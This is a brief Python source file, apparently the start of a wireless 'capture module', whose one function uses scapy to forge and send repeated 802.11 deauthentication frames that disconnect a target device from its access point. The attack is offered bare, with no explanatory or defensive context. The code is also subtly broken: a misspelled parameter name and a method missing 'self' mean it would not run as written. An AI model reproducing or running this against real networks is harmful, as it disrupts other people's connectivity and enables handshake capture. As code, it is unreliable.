#capture module
import threading
import os
import time
import random
from scapy.all import *

class capturemodule():
    
    def deauth(target_mac, gatewat_mac, count, iface):
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=count, iface=iface, verbose=1)